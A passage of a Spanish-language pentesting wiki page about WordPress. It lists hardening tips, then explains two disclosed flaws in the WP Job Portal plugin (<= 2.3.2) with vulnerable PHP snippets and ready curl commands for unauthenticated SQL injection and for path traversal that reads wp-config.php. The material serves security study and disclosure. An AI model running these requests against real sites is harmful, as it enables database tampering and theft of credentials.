- Usa **contrase√±as fuertes** y **2FA**
- Revisa peri√≥dicamente los **permisos** de los usuarios
- **Limita los intentos de inicio de sesi√≥n** para prevenir ataques de Brute Force
- Renombra el archivo **`wp-admin.php`** y permite el acceso solo internamente o desde ciertas direcciones IP.


### SQL Injection no autenticada mediante validaci√≥n insuficiente (WP Job Portal <= 2.3.2)

El plugin de reclutamiento WP Job Portal expon√≠a una tarea **savecategory** que finalmente ejecuta el siguiente c√≥digo vulnerable dentro de `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Problemas introducidos por este fragmento:

1. **Unsanitised user input** ‚Äì `parentid` proviene directamente de la petici√≥n HTTP.
2. **String concatenation inside the WHERE clause** ‚Äì no `is_numeric()` / `esc_sql()` / prepared statement.
3. **Unauthenticated reachability** ‚Äì aunque la acci√≥n se ejecuta a trav√©s de `admin-post.php`, la √∫nica comprobaci√≥n es un **CSRF nonce** (`wp_verify_nonce()`), que cualquier visitante puede recuperar desde una p√°gina p√∫blica que incruste el shortcode `[wpjobportal_my_resumes]`.

#### Explotaci√≥n

1. Obtener un nonce fresco:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Inyectar SQL arbitrario abusando de `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
La respuesta revela el resultado de la consulta inyectada o modifica la base de datos, demostrando la SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Otra tarea, **downloadcustomfile**, permit√≠a a los visitantes descargar **cualquier archivo en el disco** mediante path traversal. El sink vulnerable est√° ubicado en `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` est√° controlado por el atacante y concatenado **sin sanitizaci√≥n**.  De nuevo, la √∫nica barrera es un **CSRF nonce** que puede obtenerse desde la p√°gina del CV.

#### Explotaci√≥n
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
El servidor responde con el contenido de `wp-config.php`, leaking DB credentials and auth keys.

## Referencias

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
